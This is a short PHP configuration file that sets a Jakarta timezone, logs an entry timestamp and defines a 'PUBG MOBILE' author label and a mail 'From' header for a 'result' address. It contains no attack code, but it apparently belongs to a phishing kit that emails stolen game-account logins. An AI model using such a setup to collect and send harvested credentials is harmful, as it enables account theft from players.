<?php
date_default_timezone_set('Asia/Jakarta');
$jamasuk = date('l, d-m-Y h:i:s');

$author = 'PUBG MOBILE';
$sender = 'From: GLACIER MAXX <result@akugungrate.com>';
?>